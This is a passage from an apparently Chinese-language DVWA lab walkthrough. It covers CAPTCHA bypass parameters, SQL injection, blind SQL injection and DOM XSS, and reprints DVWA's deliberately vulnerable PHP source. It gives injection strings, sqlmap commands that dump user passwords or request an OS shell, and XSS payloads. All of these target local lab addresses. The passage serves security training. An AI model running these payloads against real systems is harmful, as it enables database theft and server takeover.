class="line">?page=file:///var/www/html/dvwa//hackable/uploads/th.jpeg</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210427184134233.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210427184134233"></p><h2 id="insecure-captcha"><a class="markdownIt-Anchor" href="#insecure-captcha">#</a> Insecure CAPTCHA</h2><h3 id="low-6"><a class="markdownIt-Anchor" href="#low-6">#</a> Low</h3><ul><li>修改包的参数 step=2 即可。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">step=2&amp;password_new=123&amp;password_conf=123&amp;Change=Change</span><br><span class="line"></span><br><span class="line">Password Changed.</span><br></pre></td></tr></table></figure><h3 id="medium-6"><a class="markdownIt-Anchor" href="#medium-6">#</a> Medium</h3><ul><li>修改包的参数 step=2。</li><li>查看源码得知新变量 passed_captcha，谷歌返回情况，将其 POST 为 true。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">step=2&amp;password_new=123&amp;password_conf=123&amp;Change=Change&amp;passed_captcha=true</span><br></pre></td></tr></table></figure><h3 id="high-6"><a class="markdownIt-Anchor" href="#high-6">#</a> High</h3><ul><li>添加如下信息至包中</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: reCAPTCHA</span><br><span class="line">step=1&amp;password_new=123&amp;password_conf=123&amp;user_token=2143b157158c8dce48d7b94d045bad71&amp;Change=Change&amp;g-recaptcha-response=hidd3n_valu3</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="sql-injection"><a class="markdownIt-Anchor" href="#sql-injection">#</a> SQL Injection</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//SQL Injection</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Impossible SQL Injection Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( <span class="variable">$id</span> )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>, PDO::PARAM_INT );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$data</span>-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            <span class="variable">$first</span> = <span class="variable">$row</span>[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            <span class="variable">$last</span>  = <span class="variable">$row</span>[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//High SQL Injection Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_SESSION</span> [ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_SESSION</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);        </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Medium SQL Injection Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$id</span> = mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$id</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="subst">$id</span>;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>], <span class="variable">$query</span>) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Display values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line"><span class="variable">$query</span>  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"><span class="variable">$number_of_rows</span> = mysqli_fetch_row( <span class="variable">$result</span> )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Low SQL Injection Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$row</span> = mysqli_fetch_assoc( <span class="variable">$result</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = <span class="variable">$row</span>[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        <span class="variable">$last</span>  = <span class="variable">$row</span>[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="low-7"><a class="markdownIt-Anchor" href="#low-7">#</a> Low</h3><p>特点：GET</p><ul><li>1</li><li>1’//wrong</li><li>1’ or 1=1–</li><li>1’ union select 1,database()–</li><li>sqlmap</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://0.0.0.0/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie &quot;security=low; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; -D dvwa -T users -C user,password --dump </span><br></pre></td></tr></table></figure><h3 id="medium-7"><a class="markdownIt-Anchor" href="#medium-7">#</a> Medium</h3><p>特点：POST</p><ul><li>手工注入</li><li>id=1 union select 1,table_name from information_schema=dvwa–</li><li>HEX 加密关键字</li><li>id=1 union select 1,table_name from information_schema=0x64767761–</li><li>sqlmap --data 参数</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">脱裤</span></span><br><span class="line">sqlmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/#&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;security=medium; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; -D dvwa -T users -C user,password --dump --batch</span><br><span class="line"><span class="meta">#</span><span class="bash">上马</span></span><br><span class="line">lmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/#&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;security=medium; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; -D dvwa -T users -C user,password --os-shell</span><br><span class="line"><span class="meta">#</span><span class="bash">需要加绝对路径，可以利用phpinfo()</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="high-7"><a class="markdownIt-Anchor" href="#high-7">#</a> High</h3><p>特点：返回到不同页面</p><ul><li>手动无差别</li><li>sqlmap --second-url 参数</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/session-input.php&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;security=high; PHPSESSID=cqve1uen4svrvfnlga3j892sb4&quot; --second-url &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli/&quot;-D dvwa -T users -C user,password --dump --batch</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210424185429439.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="image-20210424185429439"></p><h2 id="sql-injection-blind"><a class="markdownIt-Anchor" href="#sql-injection-blind">#</a> SQL Injection (Blind)</h2><h3 id="low-8"><a class="markdownIt-Anchor" href="#low-8">#</a> Low</h3><ul><li>手注过于麻烦不演示</li><li>sqlmap</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli_blind/?id=1&amp;Submit=Submit#&quot; -p &quot;id&quot; --cookie &quot;security=low; PHPSESSID=f48dupm9bkmo862t404a2hmvl1&quot; -D dvwa -T users -C user,password --dump --batch</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="medium-8"><a class="markdownIt-Anchor" href="#medium-8">#</a> Medium</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u&quot;http://192.168.23.133/dvwa/vulnerabilities/sqli_blind/#&quot; --data &quot;id=1&amp;Submit=Submit&quot; -p &quot;id&quot; --cookie &quot;security=medium; PHPSESSID=o5v0fkp2cld3nef9aninvap224&quot; -D dvwa -T users -C user,password --dump --batch</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="high-8"><a class="markdownIt-Anchor" href="#high-8">#</a> High</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;192.168.23.133/dvwa/vulnerabilities/sqli_blind/cookie-input.php&quot; --data &quot;id=2&amp;Submit=Submit&quot; --cookie &quot;id=1; security=high; PHPSESSID=o5v0fkp2cld3nef9aninvap224&quot; --second-url &quot;http://192.168.23.133/dvwa/vulnerabilities/sqli_blind/&quot; -D dvwa -T users -C user,password --dump --batch</span><br></pre></td></tr></table></figure><h2 id="weak-session-ids"><a class="markdownIt-Anchor" href="#weak-session-ids">#</a> Weak Session IDs</h2><h3 id="low-9"><a class="markdownIt-Anchor" href="#low-9">#</a> Low</h3><h3 id="medium-9"><a class="markdownIt-Anchor" href="#medium-9">#</a> Medium</h3><h3 id="high-9"><a class="markdownIt-Anchor" href="#high-9">#</a> High</h3><h2 id="dom-based-cross-site-scripting-xss"><a class="markdownIt-Anchor" href="#dom-based-cross-site-scripting-xss">#</a> DOM Based Cross Site Scripting (XSS)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//DOM Based Cross Site Scripting (XSS) Vulnerability</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Impossible Unknown Vulnerability Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Don&#x27;t need to do anything, protction handled on the client side</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//High Unknown Vulnerability Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># White list the allowable languages</span></span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;French&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;English&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;German&quot;</span>:</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Spanish&quot;</span>:</span><br><span class="line">            <span class="comment"># ok</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Medium Unknown Vulnerability Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span> ( array_key_exists( <span class="string">&quot;default&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; !is_null (<span class="variable">$_GET</span>[ <span class="string">&#x27;default&#x27;</span> ]) ) &#123;</span><br><span class="line">    <span class="variable">$default</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Do not allow script tags</span></span><br><span class="line">    <span class="keyword">if</span> (stripos (<span class="variable">$default</span>, <span class="string">&quot;&lt;script&quot;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        header (<span class="string">&quot;location: ?default=English&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Low Unknown Vulnerability Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># No protections, anything goes</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="low-10"><a class="markdownIt-Anchor" href="#low-10">#</a> Low</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="medium-10"><a class="markdownIt-Anchor" href="#medium-10">#</a> Medium</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">option</span>&gt;</span><span class="tag">&lt;<span class="name">select</span>&gt;</span>&lt;img%20src=&quot;x&quot;%20onerror=&quot;alert(1)&quot;/&gt;</span><br></pre></td></tr></table></figure><h3 id="high-10"><a class="markdownIt-Anchor" href="#high-10">#</a> High</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">English#<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">#之后的被过滤，不传到服务端</span><br></pre></td></tr></table></figure><h2 id="reflected-cross-site-scripting-xss"><a class="markdownIt-Anchor" href="#reflected-cross-site-scripting-xss">#</a> Reflected Cross Site Scripting (XSS)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Reflected XSS</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Impossible Reflected XSS Source</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span 